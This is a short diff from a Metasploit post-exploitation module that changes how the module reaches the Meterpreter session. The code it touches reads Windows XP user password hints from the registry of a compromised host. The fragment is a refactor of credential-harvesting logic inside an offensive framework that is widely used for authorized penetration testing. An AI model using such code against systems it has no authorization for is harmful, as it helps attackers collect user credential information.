@@ -201,7 +201,7 @@ class Metasploit3 < Msf::Post
 			#Attempt to get Hints (from WinXP Location) only if it's not set yet
 			if users[rid][:UserPasswordHint].nil?	
 				begin
-					uk_hint = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
+					uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
 					users[rid][:UserPasswordHint] = uk_hint.query_value("").data
 				rescue ::Rex::Post::Meterpreter::RequestError
 					users[rid][:UserPasswordHint] = nil
